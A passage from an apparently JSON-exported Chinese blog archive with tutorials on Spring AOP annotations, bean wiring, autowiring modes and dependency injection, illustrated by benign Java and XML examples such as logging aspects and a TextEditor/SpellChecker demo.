http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd \"&gt; &lt;aop:config&gt; &lt;aop:aspect id=\"log\" ref=\"logging\"&gt; &lt;aop:pointcut id=\"selectAll\" expression=\"execution(* com.mi1k7ea.Student.getName(..))\"/&gt; &lt;aop:before pointcut-ref=\"selectAll\" method=\"beforeAdvice\"/&gt; &lt;aop:after pointcut-ref=\"selectAll\" method=\"afterAdvice\"/&gt; &lt;aop:after-returning pointcut-ref=\"selectAll\" returning=\"retVal\" method=\"afterReturningAdvice\"/&gt; &lt;aop:after-throwing pointcut-ref=\"selectAll\" throwing=\"ex\" method=\"AfterThrowingAdvice\"/&gt; &lt;/aop:aspect&gt; &lt;/aop:config&gt; &lt;!-- Definition for student bean --&gt; &lt;bean id=\"student\" class=\"com.mi1k7ea.Student\"&gt; &lt;property name=\"name\" value=\"mi1k7ea\" /&gt; &lt;property name=\"age\" value=\"6\"/&gt; &lt;/bean&gt; &lt;!-- Definition for logging aspect --&gt; &lt;bean id=\"logging\" class=\"com.mi1k7ea.Logging\"/&gt;&lt;/beans&gt; 运行输出，此时只针对特定的类方法实现AOP增强： 基于Annotation的声明式在Spring中，尽管使用XML配置文件可以实现AOP开发，但是如果所有的相关的配置都集中在配置文件中，势必会导致XML配置文件过于臃肿，从而给维护和升级带来一定的困难。 为此，AspectJ框架为AOP开发提供了另一种开发方式——基于Annotation的声明式。AspectJ允许使用注解定义切面、切入点和增强处理，而Spring框架则可以识别并根据这些注解生成AOP代理。 Annotation注解的介绍如下： 名称 说明 @Aspect 用于定义一个切面。 @Before 用于定义前置通知，相当于 BeforeAdvice。 @AfterReturning 用于定义后置通知，相当于 AfterReturningAdvice。 @Around 用于定义环绕通知，相当于MethodInterceptor。 @AfterThrowing 用于定义抛出通知，相当于ThrowAdvice。 @After 用于定义最终final通知，不管是否异常，该通知都会执行。 @DeclareParents 用于定义引介通知，相当于IntroductionInterceptor（不要求掌握）。 通过在基于架构的XML配置文件中包含以下元素来支持@AspectJ的使用： 1&lt;aop:aspectj-autoproxy/&gt; 此外，还需要在CLASSPATH中使用以下AspectJ库文件：aspectjrt.jar、aspectjweaver.jar、aspectj.jar、aopalliance.jar。 声明aspectAspects类和其他任何正常的bean一样，除了它们将会用@AspectJ注释之外，它和其他类一样可能有方法和字段，如下所示： 12345package org.xyz;import org.aspectj.lang.annotation.Aspect;@Aspectpublic class AspectModule &#123;&#125; 它们将在XML中按照如下进行配置，就和其他任何bean一样： 123&lt;bean id=\"myAspect\" class=\"org.xyz.AspectModule\"&gt; &lt;!-- configure properties of aspect here as normal --&gt;&lt;/bean&gt; 声明切入点一个切入点有助于确定使用不同建议执行的感兴趣的连接点（即方法）。在处理基于配置的XML架构时，切入点的声明有两个部分： 一个切入点表达式决定了我们感兴趣的哪个方法会真正被执行； 一个切入点标签包含一个名称和任意数量的参数。方法的真正内容是不相干的，并且实际上它应该是空的； 下面的示例中定义了一个名为‘businessService’的切入点，该切入点将与com.xyz.myapp.service包下的类中可用的每一个方法相匹配： 123import org.aspectj.lang.annotation.Pointcut;@Pointcut(\"execution(* com.xyz.myapp.service.*.*(..))\") // expression private void businessService() &#123;&#125; // signature 下面的示例中定义了一个名为‘getname’的切入点，该切入点将与com.mi1k7ea包下的Student类中的getName()方法相匹配： 123import org.aspectj.lang.annotation.Pointcut;@Pointcut(\"execution(* com.mi1k7ea.Student.getName(..))\") private void getname() &#123;&#125; 声明建议你可以使用@{ADVICE-NAME}注释声明五个建议中的任意一个，如下所示。这假设你已经定义了一个切入点标签方法businessService()： 12345678910111213141516171819202122@Before(\"businessService()\")public void doBeforeTask()&#123; ...&#125;@After(\"businessService()\")public void doAfterTask()&#123; ...&#125;@AfterReturning(pointcut = \"businessService()\", returning=\"retVal\")public void doAfterReturnningTask(Object retVal)&#123; // you can intercept retVal here. ...&#125;@AfterThrowing(pointcut = \"businessService()\", throwing=\"ex\")public void doAfterThrowingTask(Exception ex)&#123; // you can intercept thrown exception here. ...&#125;@Around(\"businessService()\")public void doAroundTask()&#123; ...&#125; 你可以为任意一个建议定义你的切入点内联。下面是在建议之前定义内联切入点的一个示例： 1234@Before(\"execution(* com.xyz.myapp.service.*.*(..))\")public doBeforeTask()&#123; ...&#125; Demo在前面例子的基础上，MainApp.java和Student.java不变。 Logging.java： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.mi1k7ea;import org.aspectj.lang.annotation.*;@Aspectpublic class Logging &#123; /** Following is the definition for a pointcut to select * all the methods available. So advice will be called * for all the methods. */ @Pointcut(\"execution(* com.mi1k7ea.*.*(..))\") private void selectAll()&#123;&#125; /** * This is the method which I would like to execute * before a selected method execution. */ @Before(\"selectAll()\") public void beforeAdvice()&#123; System.out.println(\"Going to setup student profile.\"); &#125; /** * This is the method which I would like to execute * after a selected method execution. */ @After(\"selectAll()\") public void afterAdvice()&#123; System.out.println(\"Student profile has been setup.\"); &#125; /** * This is the method which I would like to execute * when any method returns. */ @AfterReturning(pointcut = \"selectAll()\", returning=\"retVal\") public void afterReturningAdvice(Object retVal)&#123; System.out.println(\"Returning:\" + retVal.toString() ); &#125; /** * This is the method which I would like to execute * if there is an exception raised by any method. */ @AfterThrowing(pointcut = \"selectAll()\", throwing = \"ex\") public void AfterThrowingAdvice(IllegalArgumentException ex)&#123; System.out.println(\"There has been an exception: \" + ex.toString()); &#125;&#125; Beans.xml： 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd \"&gt; &lt;aop:aspectj-autoproxy/&gt; &lt;!-- Definition for student bean --&gt; &lt;bean id=\"student\" class=\"com.mi1k7ea.Student\"&gt; &lt;property name=\"name\" value=\"mi1k7ea\" /&gt; &lt;property name=\"age\" value=\"6\"/&gt; &lt;/bean&gt; &lt;!-- Definition for logging aspect --&gt; &lt;bean id=\"logging\" class=\"com.mi1k7ea.Logging\"/&gt;&lt;/beans&gt; 输出如下：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Spring基础篇之Bean装配","date":"2019-01-01T08:24:05.000Z","path":"2019/01/01/Spring基础篇之Bean装配/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Spring Bean装配Bean的装配可以理解为依赖关系注入，Bean的装配方式也就是Bean的依赖注入方式。Spring容器支持多种形式的Bean的装配方式，如基于XML的Bean装配、基于Annotation的Bean装配和自动装配等。 0x02 基于XML装配BeanSpring基于XML的装配通常采用两种实现方式，即setter方法注入（Setter Injection）和构造函数注入（Constructor Injection），这两种方式在前面也讲过。 在Spring实例化Bean的过程中，首先会调用默认的构造方法实例化Bean对象，然后通过Java的反射机制调用setXxx()方法进行属性的注入。因此，setter方法注入要求一个Bean的对应类必须满足以下两点要求： 必须提供一个默认的无参构造方法； 必须为需要注入的属性提供对应的setter方法； 使用setter方法注入时，在Spring配置文件中，需要使用&lt;bean&gt;元素的子元素&lt;property&gt;元素为每个属性注入值。而使用构造函数注入时，在配置文件中，主要使用&lt;constructor-arg&gt;标签定义构造方法的参数，可以使用其value属性（或子元素）设置该参数的值。 示例可参考前面的Spring DI文章：Spring基础篇之DI（依赖注入） 0x03 基于Annotation装配Bean在Spring中，尽管使用XML配置文件可以实现Bean的装配工作，但如果应用中Bean的数量较多，会导致XML配置文件过于臃肿，从而给维护和升级带来一定的困难。 Java从JDK 5.0以后，提供了Annotation（注解）功能，Spring也提供了对Annotation技术的全面支持。Spring3中定义了一系列的Annotation（注解），常用的注解如下： @Required@Required注释应用于bean属性的setter方法，它表明受影响的bean属性在配置时必须放在XML配置文件中，否则容器就会抛出一个BeanInitializationException异常。 @Component可以使用此注解描述Spring中的Bean，但它是一个泛化的概念，仅仅表示一个组件（Bean），并且可以作用在任何层次。使用时只需将该注解标注在相应类上即可。 @Repository用于将数据访问层（DAO层）的类标识为Spring中的Bean，其功能与@Component 相同。 @Service通常作用在业务层（Service 层），用于将业务层的类标识为Spring中的Bean，其功能与@Component相同。 @Controller通常作用在控制层（如Struts2的Action），用于将控制层的类标识为Spring中的Bean，其功能与@Component相同。 @Autowired用于对Bean的属性变量、属性的Set方法及构造函数进行标注，配合对应的注解处理器完成Bean的自动配置工作。默认按照Bean的类型进行装配。 @Resource其作用与Autowired一样。其区别在于@Autowired默认按照Bean类型装配，而@Resource默认按照Bean实例名称进行装配。 @Resource中有两个重要属性：name 和 type。如果都不指定，则先按Bean实例名称装配，如果不能匹配，则再按照Bean类型进行装配；如果都无法匹配，则抛出NoSuchBeanDefinitionException异常。 @Qualifier与@Autowired注解配合使用，会将默认的按Bean类型装配修改为按Bean的实例名称装配，Bean的实例名称由@Qualifier注解的参数指定。 @PostConstruct和@PreDestroy为了定义一个bean的安装和卸载，我们使用 init-method 和 destroy-method 参数简单的声明一下 。init-method属性指定了一个方法，该方法在bean的实例化阶段会立即被调用。同样地，destroy-method指定了一个方法，该方法只在一个bean从容器中删除之前被调用。 作用和前面说到的Bean后置处理器一样，只不过换了注释的形式来实现。 @Configuration和@Bean带有@Configuration的注解类表示这个类可以使用Spring IoC容器作为bean定义的来源。@Bean注解告诉Spring，一个带有@Bean的注解方法将返回一个对象，该对象应该被注册为在Spring应用程序上下文中的bean。 最简单可行的@Configuration类如下所示： 123456789package com.tutorialspoint;import org.springframework.context.annotation.*;@Configurationpublic class HelloWorldConfig &#123; @Bean public HelloWorld helloWorld()&#123; return new HelloWorld(); &#125;&#125; 上面的代码将等同于下面的 XML 配置： 123&lt;beans&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\" /&gt;&lt;/beans&gt; 在这里，带有@Bean注解的方法名称作为bean的ID，它创建并返回实际的bean。你的配置类可以声明多个@Bean。一旦定义了配置类，你就可以使用AnnotationConfigApplicationContext来加载并把它们提供给Spring容器，如下所示： 123456public static void main(String[] args) &#123; ApplicationContext ctx = new AnnotationConfigApplicationContext(HelloWorldConfig.class); HelloWorld helloWorld = ctx.getBean(HelloWorld.class); helloWorld.setMessage(\"Hello World!\"); helloWorld.getMessage();&#125; 你可以加载各种配置类，如下所示： 12345678public static void main(String[] args) &#123; AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(); ctx.register(AppConfig.class, OtherConfig.class); ctx.register(AdditionalConfig.class); ctx.refresh(); MyService myService = ctx.getBean(MyService.class); myService.doStuff();&#125; DemoPersonDao.java，DAO层即接口类： 12345package com.mi1k7ea;public interface PersonDao &#123; void add();&#125; PersonDaoImpl.java，DAO层接口类的实现类，首先使用@Repository注解将PersonDaoImpl类标识为Spring中的Bean，其写法相当于配置文件中&lt;bean id=&quot;personDao&quot; class=&quot;com.mi1k7ea.PersonDaoImpl&quot;/&gt;的书写。然后在add()方法中输出一句话，用于验证是否成功调用了该方法： 1234567891011package com.mi1k7ea;import org.springframework.stereotype.Repository;@Repository(\"personDao\")public class PersonDaoImpl implements PersonDao &#123; @Override public void add() &#123; System.out.println(\"Dao层的add()方法执行了...\"); &#125;&#125; PersonService.java，Service层接口类： 12345package com.mi1k7ea;public interface PersonService &#123; void add();&#125; PersonServiceImpl.java，Service层接口类的实现类， 首先使用@Service注解将PersonServiceImpl类标识为Spring中的Bean，其写法相当于配置文件中&lt;bean id=&quot;personService&quot; class=&quot;com.mi1k7ea.PersonServiceImpl&quot;/&gt;的书写。然后使用@Resource注解标注在属性personDao上（也可标注在personDao的setPersonDao()方法上），这相当于配置文件中&lt;property name=&quot;personDao&quot; ref=&quot;personDao&quot;/&gt;的写法。最后在该类的add()方法中调用personDao中的add()方法，并输出一句话 ： 12345678910111213141516171819package com.mi1k7ea;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(\"personService\")public class PersonServiceImpl implements PersonService &#123; @Resource(name = \"personDao\") private PersonDao personDao; public PersonDao getPersonDao() &#123; return personDao; &#125; @Override public void add() &#123; personDao.add();// 调用personDao中的add()方法 System.out.println(\"Service层的add()方法执行了...\"); &#125;&#125; PersonAction.java，首先使用@Controller注解标注PersonAction类，其写法相当于在配置文件中编写&lt;bean id=&quot;personAction&quot; class=&quot;com.mi1k7ea.PersonAction&quot;/&gt;。然后使用了@Resource注解标注在personService上，这相当于在配置文件内编写&lt;property name=&quot;personService&quot; ref=&quot;personService&quot;/&gt;。最后在其add()方法中调用了personService中的add()方法，并输出一句话 ： 123456789101112131415161718package com.mi1k7ea;import org.springframework.stereotype.Controller;import javax.annotation.Resource;@Controller(\"personAction\")public class PersonAction &#123; @Resource(name = \"personService\") private PersonService personService; public PersonService getPersonService() &#123; return personService; &#125; public void add() &#123; personService.add(); // 调用personService中的add()方法 System.out.println(\"Action层的add()方法执行了...\"); &#125;&#125; MainApp.java： 123456789101112131415package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; // 初始化Spring容器，加载配置文件，并对bean进行实例化 ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"Beans.xml\"); // 获得personAction实例 PersonAction personAction = (PersonAction) applicationContext.getBean(\"personAction\"); // 调用personAction中的add()方法 personAction.add(); &#125;&#125; Beans.xml，使用context命名空间的component-scan元素进行注解的扫描，其base-package属性用于通知Spring所需要扫描的目录： 12345678910111213?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!--使用context命名空间，通知spring扫描指定目录，进行注解的解析--&gt; &lt;context:component-scan base-package=\"com.mi1k7ea\"/&gt;&lt;/beans&gt; 运行输出： 0x04 自动装配Bean自动装配就是指Spring容器可以自动装配（autowire）相互协作的Bean之间的关联关系，将一个Bean注入其他Bean的Property中。 要使用自动装配，就需要配置&lt;bean&gt;元素的autowire属性。autowire 属性有以下五个值： 名称 说明 byName 根据 Property 的 name 自动装配，如果一个 Bean 的 name 和另一个 Bean 中的 Property 的 name 相同，则自动装配这个 Bean 到 Property 中。 byType 根据 Property 的数据类型（Type）自动装配，如果一个 Bean 的数据类型兼容另一个 Bean 中 Property 的数据类型，则自动装配。 constructor 根据构造方法的参数的数据类型，进行 byType 模式的自动装配。 autodetect 如果发现默认的构造方法，则用 constructor 模式，否则用 byType 模式。 no 默认情况下，不使用自动装配，Bean 依赖必须通过 ref 元素定义。 byName这种模式由属性名称指定自动装配。Spring容器看作beans，在XML配置文件中beans的auto-wire属性设置为byName。然后，它尝试将它的属性与配置文件中定义为相同名称的beans进行匹配和连接。如果找到匹配项，它将注入这些beans，否则，它将抛出异常。 例如，在配置文件中，如果一个bean定义设置为自动装配byName，并且它包含spellChecker属性（即它有一个 setSpellChecker(…) 方法），那么Spring就会查找定义名为spellChecker的bean，并且用它来设置这个属性。你仍然可以使用&lt;property&gt;标签连接其余的属性。 DemoSpellChecker.java不变。 TextEditor.java： 123456789101112131415161718192021package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; private String name; public void setSpellChecker( SpellChecker spellChecker )&#123; this.spellChecker = spellChecker; &#125; public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; MainApp.java： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); TextEditor te = (TextEditor) context.getBean(\"textEditor\"); te.spellCheck(); &#125;&#125; Beans.xml，给textEditor这个Bean添加值为byName的autowire属性： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\" autowire=\"byName\"&gt; &lt;property name=\"name\" value=\"mi1k7ea\" /&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 这里我们对比下，不应用自动装配的Beans.xml，需要通过bean元素的子元素property的ref属性来设置装配： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\"&gt; &lt;property name=\"spellChecker\" ref=\"spellChecker\" /&gt; &lt;property name=\"name\" value=\"Generic Text Editor\" /&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出： byType这种模式由属性类型指定自动装配。Spring容器看作beans，在XML配置文件中beans的autowire属性设置为byType。然后，如果它的type恰好与配置文件中beans名称中的一个相匹配，它将尝试匹配和连接它的属性。如果找到匹配项，它将注入这些beans，否则，它将抛出异常。 例如，在配置文件中，如果一个bean定义设置为自动装配byType，并且它包含SpellChecker类型的spellChecker属性，那么Spring就会查找定义名为SpellChecker的bean，并且用它来设置这个属性。你仍然可以使用&lt;property&gt;标签连接其余属性。 DemoMainApp.java，SpellChecker.java，TextEditor.java均不变。 Beans.xml，将autowire属性值改为byType： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\" autowire=\"byType\"&gt; &lt;property name=\"name\" value=\"mi1k7ea\" /&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出同上。 constructor这种模式与byType非常相似，但它应用于构造器参数。Spring容器看作beans，在XML配置文件中beans的autowire属性设置为constructor。然后，它尝试把它的构造函数的参数与配置文件中beans名称中的一个进行匹配和连线。如果找到匹配项，它会注入这些bean，否则，它会抛出异常。 例如，在配置文件中，如果一个bean定义设置为通过构造函数自动装配，而且它有一个带有SpellChecker类型的参数之一的构造函数，那么Spring就会查找定义名为SpellChecker的bean，并用它来设置构造函数的参数。你仍然可以使用&lt;constructor-arg&gt;标签连接其余属性。 DemoMainApp.java，SpellChecker.java均不变。 TextEditor.java，添加一个有参构造函数： 12345678910111213141516171819package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; private String name; public TextEditor( SpellChecker spellChecker, String name ) &#123; this.spellChecker = spellChecker; this.name = name; &#125; public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public String getName() &#123; return name; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; Beans.xml，将autowire属性值改为constructor，其中另一个参数name通过constructor-arg子元素即构造函数的形式进行装配： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\" autowire=\"constructor\"&gt; &lt;constructor-arg value=\"Generic Text Editor\"/&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"SpellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出同上。 TextEditor.java均不变。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Spring基础篇之DI（依赖注入）","date":"2019-01-01T07:17:10.000Z","path":"2019/01/01/Spring基础篇之DI（依赖注入）/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Spring DI（依赖注入）Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系。 依赖注入（Dependency Injection，DI）和控制反转含义相同，它们是从两个角度描述的同一个概念。 当某个Java实例需要另一个Java实例时，传统的方法是由调用者创建被调用者的实例（例如，使用new关键字获得被调用者实例），而使用Spring框架后，被调用者的实例不再由调用者创建，而是由Spring容器创建，这称为控制反转。Spring容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过Spring容器获得被调用者实例，这称为依赖注入。 依赖注入主要有两种实现方式，分别是属性setter方法注入和构造方法注入： 属性setter方法注入：指IoC容器使用setter方法注入被依赖的实例。通过调用无参构造器或无参static工厂方法实例化Bean后，调用该Bean的setter方法，即可实现基于setter方法的DI。 构造方法注入：指IoC容器使用构造方法注入被依赖的实例。基于构造器的DI通过调用带参数的构造方法实现，每个参数代表一个依赖。 0x02 基于setter方法的依赖注入当容器调用一个无参的构造函数或一个无参的静态factory方法来初始化你的Bean后，通过容器在你的Bean上调用setter函数，基于setter函数的DI就完成了。 DemoTextEditor.java，spellChecker属性拥有setter方法： 1234567891011121314151617package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; // a setter method to inject the dependency. public void setSpellChecker(SpellChecker spellChecker) &#123; System.out.println(\"Inside setSpellChecker.\" ); this.spellChecker = spellChecker; &#125; // a getter method to return spellChecker public SpellChecker getSpellChecker() &#123; return spellChecker; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; SpellChecker.java： 12345678910package com.mi1k7ea;public class SpellChecker &#123; public SpellChecker()&#123; System.out.println(\"Inside SpellChecker constructor.\" ); &#125; public void checkSpelling() &#123; System.out.println(\"Inside checkSpelling.\" ); &#125;&#125; MainApp.java： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); TextEditor te = (TextEditor) context.getBean(\"textEditor\"); te.spellCheck(); &#125;&#125; Beans.xml，该文件有基于setter方法的依赖注入的配置，即添加property子标签，这是由于是要把一个引用传递给一个对象，因此使用ref属性（如果要直接传递一个值则使用value属性）： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\"&gt; &lt;property name=\"spellChecker\" ref=\"spellChecker\"/&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出，可以看到在初始化Bean后容器就会调用Bean对象属性的setter方法进行属性值的依赖注入： 使用p-namespace实现XML配置如果你有许多的设值函数方法，那么在XML配置文件中使用p-namespace是非常方便的。让我们查看一下区别，以带有&lt;property&gt;标签的标准XML配置文件为例： 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"john-classic\" class=\"com.example.Person\"&gt; &lt;property name=\"name\" value=\"John Doe\"/&gt; &lt;property name=\"spouse\" ref=\"jane\"/&gt; &lt;/bean&gt; &lt;bean name=\"jane\" class=\"com.example.Person\"&gt; &lt;property name=\"name\" value=\"John Doe\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 上述XML配置文件可以使用p-namespace以一种更简洁的方式重写，如下所示： 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"john-classic\" class=\"com.example.Person\" p:name=\"John Doe\" p:spouse-ref=\"jane\"/&gt; &lt;/bean&gt; &lt;bean name=\"jane\" class=\"com.example.Person\" p:name=\"John Doe\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 在这里，你不应该区别指定原始值和带有p-namespace的对象引用。-ref部分表明这不是一个直接的值，而是对另一个Bean的引用。 0x03 基于构造函数的依赖注入当容器调用带有一组参数的类构造函数时，基于构造函数的DI就完成了，其中每个参数代表一个对其他类的依赖。 DemoSpellChecker.java和MainApp.java不变。 TextEditor.java ，拥有一个带参数的构造函数： 123456789101112package com.mi1k7ea;public class TextEditor &#123; private SpellChecker spellChecker; public TextEditor(SpellChecker spellChecker) &#123; System.out.println(\"Inside TextEditor constructor.\" ); this.spellChecker = spellChecker; &#125; public void spellCheck() &#123; spellChecker.checkSpelling(); &#125;&#125; Beans.xml，基于构造函数的依赖注入是在bean标签内添加constructor-arg子标签，其中ref属性值表示Bean的引用： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!-- Definition for textEditor bean --&gt; &lt;bean id=\"textEditor\" class=\"com.mi1k7ea.TextEditor\"&gt; &lt;constructor-arg ref=\"spellChecker\"/&gt; &lt;/bean&gt; &lt;!-- Definition for spellChecker bean --&gt; &lt;bean id=\"spellChecker\" class=\"com.mi1k7ea.SpellChecker\" /&gt;&lt;/beans&gt; 运行输出，可以看到实例化Bean对象之后，容器会调用Bean对象的构造函数实现依赖注入： 构造函数参数解析如果存在不止一个参数时，当把参数传递给构造函数时，可能会存在歧义。要解决这个问题，那么构造函数的参数在Bean定义中的顺序就是把这些参数提供给适当的构造函数的顺序就可以了。考虑下面的类: 123456package x.y;public class Foo &#123; public Foo(Bar bar, Baz baz) &#123; // ... &#125;&#125; 下述配置文件工作顺利： 123456789&lt;beans&gt; &lt;bean id=\"foo\" class=\"x.y.Foo\"&gt; &lt;constructor-arg ref=\"bar\"/&gt; &lt;constructor-arg ref=\"baz\"/&gt; &lt;/bean&gt; &lt;bean id=\"bar\" class=\"x.y.Bar\"/&gt; &lt;bean id=\"baz\" class=\"x.y.Baz\"/&gt;&lt;/beans&gt; 让我们再检查一下我们传递给构造函数不同类型的位置。考虑下面的类： 123456package x.y;public class Foo &#123; public Foo(int year, String name) &#123; // ... &#125;&#125; 如果你使用type属性显式的指定了构造函数参数的类型，容器也可以使用与简单类型匹配的类型。例如： 12345678&lt;beans&gt; &lt;bean id=\"exampleBean\" class=\"examples.ExampleBean\"&gt; &lt;constructor-arg type=\"int\" value=\"2001\"/&gt; &lt;constructor-arg type=\"java.lang.String\" value=\"Zara\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 最后并且也是最好的传递构造函数参数的方式，使用index属性来显式的指定构造函数参数的索引。下面是基于索引为0的例子，如下所示： 12345678&lt;beans&gt; &lt;bean id=\"exampleBean\" class=\"examples.ExampleBean\"&gt; &lt;constructor-arg index=\"0\" value=\"2001\"/&gt; &lt;constructor-arg index=\"1\" value=\"Zara\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 最后，如果你想要向一个对象传递一个引用，你需要使用preperty标签的ref属性，如果你想要直接传递值，那么你应该使用如上所示的value属性。 0x04 内部Bean注入Inner Beans是在其他Bean的范围内定义的Bean。因此在bean元素内的bean元素被称为内部bean，通过这种方式也能实现依赖注入，如下： 1234567891011121314&lt;?xml version=\"1.0\" 